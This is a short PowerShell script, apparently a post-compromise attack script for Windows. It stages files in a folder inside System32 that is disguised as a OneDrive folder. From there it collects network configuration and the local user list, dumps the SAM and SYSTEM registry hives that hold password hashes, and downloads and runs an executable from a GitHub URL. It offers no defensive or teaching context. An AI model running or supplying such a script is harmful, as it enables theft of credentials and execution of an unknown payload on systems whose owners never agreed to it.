cd $env:SystemRoot\System32\Microsoft_OneDrive\BQ
ipconfig /all | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
net user | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
reg save HKLM\sam ./sam.save | echo y
reg save HKLM\system ./system.save | echo y
iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe
Start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe"
